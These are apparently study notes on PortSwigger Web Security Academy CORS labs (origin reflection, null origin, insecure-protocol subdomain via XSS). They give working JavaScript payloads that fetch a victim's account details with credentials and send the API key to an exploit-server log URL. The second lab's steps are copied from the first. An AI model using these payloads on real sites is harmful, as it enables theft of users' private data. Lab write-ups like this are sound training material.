## CORS Vulnerabilities:
- ==CORS vulnerability with basic origin reflection== - 
1. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
2. Send the request to Burp Repeater, and resubmit it with the added header:
    
    `Origin: https://example.com`
3. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://lab_id.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
        location='https://exploit-exploit_id.exploit-server.net/log?key='+this.responseText;
};
</script>
```
- ==CORS vulnerability with trusted null origin== - 
1. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
2. Send the request to Burp Repeater, and resubmit it with the added header:
    
    `Origin: https://example.com`
3. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://lab_id.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-exploit_id.exploit-server.net/log?key='+this.responseText;
};
</script>"></iframe>
```

- ==CORS vulnerability with trusted insecure protocols== 
  1. Response contains the `Access-Control-Allow-Credentials`
  2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS. Added header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
  3. Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain. Observe that the `productID` parameter is vulnerable to XSS.
  4. ```
     <script> document.location="http://stock.lab_id.web-security-academy.net/?productId=4%3cscript>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://lab_id.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-exploit_id.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
     ```

